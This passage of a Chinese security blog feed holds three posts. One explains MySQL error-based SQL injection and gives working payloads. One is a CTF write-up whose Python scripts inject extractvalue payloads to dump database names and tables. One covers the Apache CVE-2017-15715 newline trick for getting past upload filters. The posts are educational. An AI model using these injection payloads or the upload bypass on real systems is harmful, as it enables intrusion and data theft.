alt></p><p>随机出现报错。然后再插入一条，三条记录之后，也和2条记录一样进行随机报错。</p><p>由此可见报错和随机因子是有关联的，但有什么关联呢，为什么直接使用rand()，有两条记录的情况下就会报错，而且是有时候报错，有时候不报错，而rand(0)</p><p>的时候在两条的时候不报错，在三条以上就绝对报错？我们继续往下看。</p><h4 id="0x04不确定性与确定性"><a href="#0x04不确定性与确定性" class="headerlink" title="0x04不确定性与确定性"></a><strong>0x04不确定性与确定性</strong></h4><p>前面说过，floor(rand(0)<em>2)报错的原理是恰恰是由于它的确定性，这到底是为什么呢？从0x03我们大致可以猜想到，因为floor(rand()</em>2)不加随机因子的时候是随机出错的，而在3条记录以上用floor(rand(0)<em>2)就一定报错，由此可猜想floor(rand()</em>2)是比较随机的，不具备确定性因素，而floor(rand(0)<em>2)具备某方面的确定性。<br>为了证明我们猜想，分别对floor(rand()</em>2)和floor(rand(0)<em>2)在多记录表中执行多次(记录选择10条以上)，在有12条记录表中执行结果如下图：<br><img src="/images/19.png" alt><br>连续3次查询，毫无规则，接下来看看select floor(rand(0)</em>2) from T-Safe;，如下图：<br><img src="/images/20.png" alt><br>可以看到floor(rand(0)*2)是有规律的，而且是固定的，这个就是上面提到的由于是确定性才导致的报错，那为何会报错呢，我们接着往下看。</p><h4 id="0x05-count与group-by的虚拟表"><a href="#0x05-count与group-by的虚拟表" class="headerlink" title="0x05 count与group by的虚拟表"></a><strong>0x05 count与group by的虚拟表</strong></h4><p>使用select count(<em>) from T-Safe group by x;这种语句的时候我们经常可以看到下面类似的结果：<br><img src="/images/21.png" alt><br>可以看出 test12的记录有5条与count()的结果相符合，那么mysql在遇到select count() from TSafe group by x;这语句的时候到底做了哪些操作呢，我们果断猜测mysql遇到该语句时会建立一个虚拟表(实际上就是会建立虚拟表)，那整个工作流程就会如下图所示：<br>1.先建立虚拟表，如下图(其中key是主键，不可重复):<br><img src="/images/22.png" alt><br>2.开始查询数据，取数据库数据，然后查看虚拟表存在不，不存在则插入新记录，存在则count(</em>)字段直接加1，如下图:<br><img src="/images/23.png" alt><br>3.由此看到 如果key存在的话就+1， 不存在的话就新建一个key。<br>那这个和报错有啥内在联系，我们直接往下来，其实到这里，结合前面的内容大家也能猜个一二了。</p><h4 id="0x06-floor-rand-0-2-报错"><a href="#0x06-floor-rand-0-2-报错" class="headerlink" title="0x06 floor(rand(0)*2)报错"></a><strong>0x06 floor(rand(0)*2)报错</strong></h4><p>其实mysql官方有给过提示，就是查询的时候如果使用rand()的话，该值会被计算多次，那这个”被计算多次”到底是什么意思，就是在使用group by的时候，floor(rand(0)*</p><p>2)会被执行一次，如果虚表不存在记录，插入虚表的时候会再被执行一次，我们来看下floor(rand(0)<em>2)报错的过程就知道了，从0x04可以看到在一次多记录的查询过程中floor(rand(0)</em>2)的值是定性的，为011011…(记住这个顺序很重要)，报错实际上就是floor(rand(0)2)被计算多次导致的，具体看看select count() from TSafe group by floor(rand(0)2);的查询过程：</p><p>1.查询前默认会建立空虚拟表如下图:<br><img src="/images/25.png" alt></p><p>2.取第一条记录，执行floor(rand(0)<em>2)，发现结果为0(第一次计算),查询虚拟表，发现0的键值不存在，则floor(rand(0)</em>2)会被再计算一次，结果为1(第二次计算)，插入虚表，这时第一条记录查询完毕，如下图:</p><p><img src="/images/26.png" alt></p><p>3.查询第二条记录，再次计算floor(rand(0)*2)，发现结果为1(第三次计算)，查询虚表，发现1的键值存在，所以floor(rand(0)2)不会被计算第二次，直接count()加1，第二条记录查询完毕，结果如下:<br><img src="/images/27.png" alt></p><p>4.查询第三条记录，再次计算floor(rand(0)<em>2)，发现结果为0(第4次计算)，查询虚表，发现键值没有0，则数据库尝试插入一条新的数据，在插入数据时floor(rand(0)</em>2)被再次计算，作为虚表的主键，其值为1(第5次计算</p><p>)，然而1这个主键已经存在于虚拟表中，而新计算的值也为1(主键键值必须唯一)，所以插入的时候就直接报错了。</p><p>5.整个查询过程floor(rand(0)*2)被计算了5次，查询原数据表3次，所以这就是为什么数据表中需要3条数据，使用该语句才会报错的原因。</p><h4 id="0x07-floor-rand-2-报错"><a href="#0x07-floor-rand-2-报错" class="headerlink" title="0x07 floor(rand()*2)报错"></a><strong>0x07 floor(rand()*2)报错</strong></h4><p>由0x05我们可以同样推理出不加入随机因子的情况，由于没加入随机因子，所以floor(rand()*2)是不可测的，因此在两条数据的时候，只要出现下面情况，即可报错，如下图:</p><p><img src="/images/28.png" alt></p><p>最重要的是前面几条记录查询后不能让虚表存在0,1键值，如果存在了，那无论多少条记录，也都没办法报错，因为floor(rand()*<br>2)不会再被计算做为虚表的键值，这也就是为什么不加随机因子有时候会报错，有时候不会报错的原因。如图：<br><img src="/images/29.png" alt></p><p>当前面记录让虚表长成这样子后，由于不管查询多少条记录，floor(rand()2)的值在虚表中都能找到，所以不会被再次计算，只是简单的增加count()字段的数量，所以不会报错，比如floor(rand(1)*2)，如图：<br><img src="/images/30.png" alt></p><h3 id="这里再补充一下知识点"><a href="#这里再补充一下知识点" class="headerlink" title="这里再补充一下知识点"></a><strong>这里再补充一下知识点</strong></h3><p><strong>UpdateXml() MYSQL显错注入</strong></p><p>在学习之前,需要先了解 UpdateXml() 。</p><p>UPDATEXML (XML_document, XPath_string, new_value);</p><p>第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc</p><p>第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。</p><p>第三个参数：new_value，String格式，替换查找到的符合条件的数据</p><p>作用：改变文档中符合条件的节点的值</p><p>然后咱们再看看语句：</p><p><code>http://www.XXXIII.com/a.php?id=1 and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)</code></p><p>CONCAT(str1,str2,…)</p><p>返回结果为连接参数产生的字符串。如有任何一个参数为NULL ，则返回值为 NULL。</p><p>通过查询@@version,返回版本。然后CONCAT将其字符串化。因为UPDATEXML第二个参数需要Xpath格式的字符串,所以不符合要求，然后报错。</p><p>错误大概会是：</p><p><code>ERROR 1105 (HY000): XPATH syntax error: ’:root@localhost’</code><br><strong>1、floor函数</strong></p><p>因为之前讲双查询语句时，就把floor函数报错也进行了讲解，这里就不再重复。忘记的翻翻我的其他博客(sql分类)</p><p>这里贴个sql注入的floor语句公式：</p><p>and (select 1 from(select count(),concat(version(),floor(rand(0)2))x from information_schema.tables group by x)a)</p><p>这些sql注入的语句公式，都是研究人员经过测试总结出来的。我们需要的则是，了解这个语句公式的含义和了解其背后的逻辑原理，之后收集一些sql</p><p>语句注入公式拿来进行fuzz检测即可。简单一句话就是:自己在看懂和明白sql注入的原理基础上，那别人总结出的sql注入语句利用实现就好了。因为很</p><p>多sql注入语句都是基于这些sql注入原始公式语句变形而来的，背后的逻辑原理不会改变的。好啦，不吹了，我们继续学习剩下的函数。</p><p><strong>2、exp()函数</strong></p><p>exp函数相信大家都十分的熟悉，这是一个数学函数，用于计算e的x次方的函数。</p><p>exp函数特性：在mysql数据库中，exp()只能计算710之内的数值，一旦超过或者等于710的话，则会进行整形报错溢出。提示：DOUBLE value is out</p><p>of range in ‘exp(710)’ double类型超出了exp(710)范围。<br><img src="/images/31.png" alt></p><p>这里顺便在提下~，如果构造利用为 ~0的话，它是代表着按0按位取反就会返回“18446744073709551615”，得到最大的无符号BIGINT值。<br><img src="/images/32.png" alt></p><p>所以利用上述exp和<del>特性，我们可以构造成payload:and (EXP(</del>(select * from(select version())a)));</p><p>利用环境：mysql&gt;5.5.5</p><p>利用它的这个特性，我们可以构造成payload:and (EXP(<del>(select * from(select version())a)));<br><img src="/images/33.png" alt><br>通过先是通过子查询产生了最大的无符号BIGINT值，之后通过exp()函数形成了DOUBLE报错，从而能够得到我们想要的版本报错信息。<br>至于后面怎么操作，不要太死板呀。就version()你看看怎么改，换成什么database(),user()…自己慢慢思考下。<br>在这里有些人可能会有一些问题：就是说为啥exp(</del>数据库版本)，就会报错？其实在这里我们可以不用去关注select查询的东西，select在这个语句他只要成功执行就会返回一个0，所以就相当于exp( <del>0)<br>3、数据重复报错<br>利用环境：mysql低版本<br>payload：select * from (select NAMECONST(version(),1),NAMECONST(version(),1))x<br><img src="/images/34.png" alt><br>这里利用了数据库无法识别重复查询数据库版本信息的操作，从而进行报错。<br>4、Xpath报错（我的博客好像也单独讲过）<br>数据库环境:mysql 5.1.5<br>在学习Xpath函数之前，我们先了解下updatexml()函数和extractvalue()函数。<br>updataxml()函数<br>UPDATEXML (XMLdocument, XPathstring, new_value);<br>第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc<br>第二个参数：XPath_string (Xpath格式的字符串)<br>第三个参数：new_value，String格式，替换查找到的符合条件的数据<br>作用：改变文档中符合条件的节点的值（其实简单的说，就是对xml进行查询和修改）<br>简单分析下，在这里我们先是查询了数据库的版本信息，而后concat函数进行连接字符串信息，然后利用xml语法进行查询和修改。但是我们却使用<br>0x7e进行拼接，0x7e是啥？这是特殊字符</del>进行十六进制转换的结果。同时updataxml函数是第二位置是拼接xml字符串，而extractvalue是需要xml路<br>径。至于xml具体语法我就不讲解了，这里0x7e嵌套在里面的话，xml语法是无法识别的，所以会进行报错，从而产生了报错得到我们想要的信息。</p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;0x00-疑问&quot;&gt;&lt;a href=&quot;#0x00-疑问&quot; class=&quot;headerlink&quot; title=&quot;0x00 疑问&quot;&gt;&lt;/a&gt;&lt;strong&gt;0x00 疑问&lt;/strong&gt;&lt;/h3&gt;&lt;hr&gt;
&lt;p&gt;一直在用mysql数据库报错注入方法，但为何会报错？&lt;/p&gt;
    
    </summary>
    
      <category term="漏洞原理" scheme="http://yoursite.com/categories/%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/"/>
    
      <category term="SQL注入" scheme="http://yoursite.com/categories/%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/SQL%E6%B3%A8%E5%85%A5/"/>
    
    
  </entry>
  
  <entry>
    <title>实验吧---加了料的报错注入</title>
    <link href="http://yoursite.com/2019/08/03/%E5%AE%9E%E9%AA%8C%E5%90%A7-%E5%8A%A0%E4%BA%86%E6%96%99%E7%9A%84%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/"/>
    <id>http://yoursite.com/2019/08/03/实验吧-加了料的报错注入/</id>
    <published>2019-08-03T01:02:11.000Z</published>
    <updated>2019-08-03T06:07:56.137Z</updated>
    
    <content type="html"><![CDATA[<h4 id="实验吧-WEB-加了料的报错注入"><a href="#实验吧-WEB-加了料的报错注入" class="headerlink" title="实验吧 WEB 加了料的报错注入"></a><strong>实验吧 WEB 加了料的报错注入</strong></h4><hr><p>打开页面是post注入，又是报错注入。所以就用到了burp，后来发现burp不好用，加了消息头也不好用，不知道为啥。既然是post那么就用脚本吧。</p><a id="more"></a><p>1.首先正常传参：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">"http://ctf5.shiyanbar.com/web/baocuo/index.php"</span></span><br><span class="line">r=requests.session()</span><br><span class="line">s=r.post(url,data=&#123;<span class="string">'username'</span>:<span class="string">"1"</span>,<span class="string">'password'</span>:<span class="string">"1"</span>&#125;)</span><br><span class="line">print(s.text)</span><br></pre></td></tr></table></figure><p><img src="http://i1.fuimg.com/695378/75b517bc7aa5cfc5.png" alt><br>2.看看是否能够绕过：<br>(其实这道题比较简单毕竟是直接给你了源码比较好绕过)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">"http://ctf5.shiyanbar.com/web/baocuo/index.php"</span></span><br><span class="line">r=requests.session()</span><br><span class="line">s=r.post(url,data=&#123;<span class="string">'username'</span>:<span class="string">"'or '1"</span>,<span class="string">'password'</span>:<span class="string">"'or '1"</span>&#125;)</span><br><span class="line">print(s.text)</span><br></pre></td></tr></table></figure><p>查看回显，呦呵有点东西哈。sql语句在这里就不解释了，很简单。<br><img src="/images/1.png" alt><br>然后我又尝试了一个语句：<br>很明显这个语句跟上一个的语句一样，但是结果出现了sql注入检查</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">"http://ctf5.shiyanbar.com/web/baocuo/index.php"</span></span><br><span class="line">r=requests.session()</span><br><span class="line">s=r.post(url,data=&#123;<span class="string">'username'</span>:<span class="string">"1' and"</span>,<span class="string">'password'</span>:<span class="string">"'or 1='1"</span>&#125;)</span><br><span class="line">print(s.text)</span><br></pre></td></tr></table></figure><p><img src="/images/2.png" alt></p><p>###<strong>注入开始</strong><br>既然是加了料的报错，肯定是过滤了而且是报错。再次之前请允许小白在复习一次报错注入。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">"http://ctf5.shiyanbar.com/web/baocuo/index.php"</span></span><br><span class="line">r=requests.session()</span><br><span class="line">s=r.post(url,data=&#123;<span class="string">'username'</span>:<span class="string">"1' and updatexml(1,concat(0x7e,(select version()),0x7e),1)--+"</span>,<span class="string">'password'</span>:<span class="string">"'or '1"</span>&#125;)</span><br><span class="line">print(s.text)</span><br></pre></td></tr></table></figure><p><img src="/images/3.png" alt><br>被检测到了一看就是被过滤了，加了料的嘛！那我们肯定就需要检查过滤函数，进行模糊测试啥的比如burp，但是burp又不好使。。。。emmmmmmmmmmmmmmmmm。（这里先绕过）<br>对经常使用的报错注入函数updatexml进行测试。在密码中禁止对updatexml的使用，但是用户名并没有禁止。因此通过updatexml在存储非XPath格式的字符串时的报错输出获得所需要的信息。<br>接下来就开始试后台的过滤逻辑，实验中发现：username中不允许使用()，也就是说无法使用函数，那报错注入岂不是没有办法做了？那用password注入呢？因为后台逻辑要查询两个字段，所以password字段在这道题里也可以注入。发现password中不允许使用floor、extractvalue等这些报错函数，也就是说报错注入在password这里也做不了了。也就是说，我们可以username里写报错函数名，password里写剩下的语句，但是这样会有多余的’and<br>password=‘那要怎么做呢？记得我们得知的SQL语句格式嘛？ where username=’???’ and<br>password=’???’ 而sql语句中可以使用//注释掉中间的SQL语句。也就是说，我们可以使用//来解决这个问题，而且/<strong>/也没有被吃掉，这叫做HTTP分割注入。<br>**爆出数据库版本：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">url=&quot;http://ctf5.shiyanbar.com/web/baocuo/index.php&quot;</span><br><span class="line">r=requests.session()</span><br><span class="line">s=r.post(url,data=&#123;&apos;username&apos;:&quot;1&apos; and extractvalue/*&quot;,&apos;password&apos;:&quot;*/(1,concat(0x7e,(select version()))) and &apos;1&quot;&#125;)</span><br><span class="line">print(s.text)</span><br></pre></td></tr></table></figure><p><img src="/images/4.png" alt><br><strong>爆出数据库名字：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">url=&quot;http://ctf5.shiyanbar.com/web/baocuo/index.php&quot;</span><br><span class="line">r=requests.session()</span><br><span class="line">s=r.post(url,data=&#123;&apos;username&apos;:&quot;1&apos; and extractvalue/*&quot;,&apos;password&apos;:&quot;*/(1,concat(0x7e,(select database()))) and &apos;1&quot;&#125;)</span><br><span class="line">print(s.text)</span><br></pre></td></tr></table></figure><p><img src="/images/5.png" alt><br><strong>爆出表名：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">url=&quot;http://ctf5.shiyanbar.com/web/baocuo/index.php&quot;</span><br><span class="line">r=requests.session()</span><br><span class="line">s=r.post(url,data=&#123;&apos;username&apos;:&quot;1&apos; and extractvalue/*&quot;,&apos;password&apos;:&quot;*/(1,concat(0x7e,(select group_concat(table_name) from infromation_schema.tables where !table_schema&lt;&gt;&apos;error_based_hpf&apos;))) and &apos;1&quot;&#125;)</span><br><span class="line">print(s.text)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">url=&quot;http://ctf5.shiyanbar.com/web/baocuo/index.php&quot;</span><br><span class="line">r=requests.session()</span><br><span class="line">s=r.post(url,data=&#123;&apos;username&apos;:&quot;1&apos; and extractvalue/*&quot;,&apos;password&apos;:&quot;*/(1,concat(0x7e,(select group_concat(table_name) from infromation_schema.tables where table_schema regexp &apos;error_based_hpf&apos;))) and &apos;1&quot;&#125;)</span><br><span class="line">print(s.text)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">url=&quot;http://ctf5.shiyanbar.com/web/baocuo/index.php&quot;</span><br><span class="line">r=requests.session()</span><br><span class="line">s=r.post(url,data=&#123;&apos;username&apos;:&quot;1&apos; and extractvalue/*&quot;,&apos;password&apos;:&quot;*/(1,concat(0x7e,(select group_concat(table_name) from infromation_schema.tables where table_schema regexp &apos;error_based_hpf&apos;))) and &apos;1&quot;&#125;)</span><br><span class="line">print(s.text)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">url=&quot;http://ctf5.shiyanbar.com/web/baocuo/index.php&quot;</span><br><span class="line">r=requests.session()</span><br><span class="line">s=r.post(url,data=&#123;&apos;username&apos;:&quot;1&apos; and extractvalue/*&quot;,&apos;password&apos;:&quot;*/(1,concat(0x7e,(select group_concat(table_name) from infromation_schema.tables where table_schema in (十六进制)))) and &apos;1&quot;&#125;)</span><br><span class="line">print(s.text)</span><br></pre></td></tr></table></figure><p>PS：<br>这里关于等号绕过使用了！ &lt;&gt; regexp 十六进制编码。</p>]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;实验吧-WEB-加了料的报错注入&quot;&gt;&lt;a href=&quot;#实验吧-WEB-加了料的报错注入&quot; class=&quot;headerlink&quot; title=&quot;实验吧 WEB 加了料的报错注入&quot;&gt;&lt;/a&gt;&lt;strong&gt;实验吧 WEB 加了料的报错注入&lt;/strong&gt;&lt;/h4&gt;&lt;hr&gt;
&lt;p&gt;打开页面是post注入，又是报错注入。所以就用到了burp，后来发现burp不好用，加了消息头也不好用，不知道为啥。既然是post那么就用脚本吧。&lt;/p&gt;
    
    </summary>
    
      <category term="CTF" scheme="http://yoursite.com/categories/CTF/"/>
    
      <category term="SQL注入" scheme="http://yoursite.com/categories/CTF/SQL%E6%B3%A8%E5%85%A5/"/>
    
    
  </entry>
  
  <entry>
    <title>apache最新解析漏洞(CVE-2017-15715)绕过文件上传限制</title>
    <link href="http://yoursite.com/2019/08/01/apache%E6%9C%80%E6%96%B0%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E-CVE-2017-15715-%E7%BB%95%E8%BF%87%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%99%90%E5%88%B6/"/>
    <id>http://yoursite.com/2019/08/01/apache最新解析漏洞-CVE-2017-15715-绕过文件上传限制/</id>
    <published>2019-08-01T11:58:36.000Z</published>
    <updated>2019-08-03T06:01:30.225Z</updated>
    
    <content type="html"><![CDATA[<p>apache最新解析漏洞(CVE-2017-15715)绕过文件上传限制</p><a id="more"></a><h4 id="0x01-正则表达式中的’-’"><a href="#0x01-正则表达式中的’-’" class="headerlink" title="0x01 正则表达式中的’$’"></a><strong>0x01 正则表达式中的’$’</strong></h4><hr><p>apache这次解析漏洞的根本原因就是这个 $，正则表达式中，我们都知道$用来匹配字符串结尾位置，我们来看看菜鸟教程中对正则表达符$的解释：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">匹配输入字符串的结尾位置。如果设置了 RegExp 对象的 Multiline 属性，则 $ 也匹配 ‘\n’ 或 ‘\r’。要匹配 $ 字符本身，请使用 \$。</span><br></pre></td></tr></table></figure><p>那么就明白了，在设置了 RegExp 对象的 Multiline 属性的条件下，$还会匹配到字符串结尾的换行符</p><h4 id="0x02-Linux环境"><a href="#0x02-Linux环境" class="headerlink" title="0x02 Linux环境"></a><strong>0x02 Linux环境</strong></h4><hr><p>这里本地是debian系的kali linux，apache配置文件路径在/etc/apache2/下，apache2.conf是apache核心配置文件，由于我本地php作为apache的mod方式运行的，所以需要在mods-enabled目录下找到关于apache-php模块的配置：(关于apache和php之间的某些关系可以移步我的博客):<br><img src="http://i2.tiimg.com/695378/1a4dca1a47727140.png" alt><br>找到对应的模板和软连接：<br><code>php7.0.conf -&gt; ../mods-available/php7.0.conf</code></p><hr><p>在这里补充一下软连接的含义吧：<br>在Linux下当我们需要在不同的目录，用到相同的文件时，我们不需要在每一个需要的目录下都放一个必须相同的文件，我们只要在某个固定的目录，放上该文件，然后在其它的 目录下用ln命令链接（link）它就可以，不必重复的占用磁盘空间。例如：ln -s /bin/less /usr/local/bin/less。linux下的软链接类似于windows下的快捷方式。</p><hr><p>可以看见php7.0.conf是mods-available/php7.0.conf的软链接，配置如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">root@kali:/etc/apache2/mods-enabled<span class="comment"># cat php7.0.conf</span></span><br><span class="line">&lt;FilesMatch <span class="string">".+\.ph(p[3457]?|t|tml)$"</span>&gt;</span><br><span class="line">    SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br><span class="line">&lt;FilesMatch <span class="string">".+\.phps$"</span>&gt;</span><br><span class="line">    SetHandler application/x-httpd-php-source</span><br><span class="line">    <span class="comment"># Deny access to raw php sources by default</span></span><br><span class="line">    <span class="comment"># To re-enable it's recommended to enable access to the files</span></span><br><span class="line">    <span class="comment"># only in specific virtual host or directory</span></span><br><span class="line">    <span class="keyword">Require</span> all denied</span><br><span class="line">&lt;/FilesMatch&gt;</span><br><span class="line"><span class="comment"># Deny access to files without filename (e.g. '.php')</span></span><br><span class="line">&lt;FilesMatch <span class="string">"^\.ph(p[3457]?|t|tml|ps)$"</span>&gt;</span><br><span class="line">    <span class="keyword">Require</span> all denied</span><br><span class="line">&lt;/FilesMatch&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Running PHP scripts in user directories is disabled by default</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="comment"># To re-enable PHP in user directories comment the following lines</span></span><br><span class="line"><span class="comment"># (from &lt;IfModule ...&gt; to &lt;/IfModule&gt;.) Do NOT set it to On as it</span></span><br><span class="line"><span class="comment"># prevents .htaccess files from disabling it.</span></span><br><span class="line">&lt;IfModule mod_userdir.c&gt;</span><br><span class="line">    &lt;Directory /home<span class="comment">/*/public_html&gt;</span></span><br><span class="line"><span class="comment">        php_admin_flag engine Off</span></span><br><span class="line"><span class="comment">    &lt;/Directory&gt;</span></span><br><span class="line"><span class="comment">&lt;/IfModule&gt;</span></span><br></pre></td></tr></table></figure><p>第一行就告诉了我们apache会将哪些后缀的文件当做php解析：<br><code>&lt;FilesMatch &quot;.+\.ph(p[3457]?|t|tml)$&quot;&gt;</code><br>以如下方式结尾的文件会被apache当做php解析：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">php</span><br><span class="line">php3</span><br><span class="line">php4</span><br><span class="line">php5</span><br><span class="line">php7</span><br><span class="line">pht</span><br><span class="line">phtml</span><br></pre></td></tr></table></figure><p>如果我们再结合我们上面提到的关于$的使用，很容易想到，如果后缀名是上面这些后缀名以换行符结尾，那么也是可以解析的，本地构造文件：<br><img src="http://i1.fuimg.com/695378/088726365c0dbc83.png" alt="21158243fd1de193c508763834bad2a5.png"><br>文件构造好了，从浏览器打开试试看看能不能解析：<br><img src="http://i1.fuimg.com/695378/f8245a35be500151.png" alt></p><hr><p>补充一下Linux的知识：<br>开启Apache服务在终端输入”vim /etc/apache2/ports.conf” -&gt; 键盘输入i  进入插入编辑模式 -&gt; 修改apache2默认监听端口号为8080 -&gt; 编辑好后，按Esc键+”:wq”保存退出 -&gt; 在终端输入”/etc/init.d/apache2 start”</p><hr><h4 id="0x02-Windows环境"><a href="#0x02-Windows环境" class="headerlink" title="0x02 Windows环境"></a><strong>0x02 Windows环境</strong></h4><p>关于windows环境，p牛博客下面有一些人说测试失败，我也进行了测试，虚拟机环境 win7+phpstudy : Apache/2.4.23 (Win32) OpenSSL/1.0.2j PHP/5.4.45配置文件(${Apache_path}/conf/extra/httpd-php.conf)如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">LoadFile &quot;C:/Users/admin/Desktop/phpstudy/php/php-5.4.45/php5ts.dll&quot;</span><br><span class="line">LoadModule php5_module &quot;C:/Users/admin/Desktop/phpstudy/php/php-5.4.45/php5apache2_4.dll&quot;</span><br><span class="line">&lt;IfModule php5_module&gt;</span><br><span class="line">PHPIniDir &quot;C:/Users/admin/Desktop/phpstudy/php/php-5.4.45/&quot;</span><br><span class="line">&lt;/IfModule&gt;</span><br><span class="line">LoadFile &quot;C:/Users/admin/Desktop/phpstudy/php/php-5.4.45/libssh2.dll&quot;</span><br><span class="line">&lt;FilesMatch &quot;\.php$&quot;&gt;</span><br><span class="line">    SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure><p>用p牛的代码测试：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;&lt;body&gt;</span><br><span class="line"></span><br><span class="line">    &lt;form action=<span class="string">"test.php"</span> method=<span class="string">"post"</span> enctype=<span class="string">"multipart/form-data"</span>&gt;</span><br><span class="line"></span><br><span class="line">    &lt;input type=<span class="string">"file"</span> name=<span class="string">"file"</span> /&gt;</span><br><span class="line"></span><br><span class="line">    &lt;input type=<span class="string">"text"</span> name=<span class="string">"name"</span> /&gt;</span><br><span class="line"></span><br><span class="line">    &lt;input type=<span class="string">"submit"</span> value=<span class="string">"上传文件"</span> /&gt;</span><br><span class="line"></span><br><span class="line">    &lt;/form&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;&lt;/html&gt;<span class="meta">&lt;?php</span><span class="keyword">if</span>(<span class="keyword">isset</span>($_FILES[<span class="string">'file'</span>])) &#123;</span><br><span class="line">    $name = basename($_POST[<span class="string">'name'</span>]);</span><br><span class="line">    $ext = pathinfo($name,PATHINFO_EXTENSION);</span><br><span class="line">    <span class="keyword">if</span>(in_array($ext, [<span class="string">'php'</span>, <span class="string">'php3'</span>, <span class="string">'php4'</span>, <span class="string">'php5'</span>, <span class="string">'phtml'</span>, <span class="string">'pht'</span>])) &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">'bad file'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    move_uploaded_file($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>], <span class="string">'./'</span> . $name);&#125;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>抓包修改文件名，上传：<br><img src="http://i1.fuimg.com/695378/e28c88feedd404ce.png" alt><br><img src="http://i1.fuimg.com/695378/716846f65e61ed1a.png" 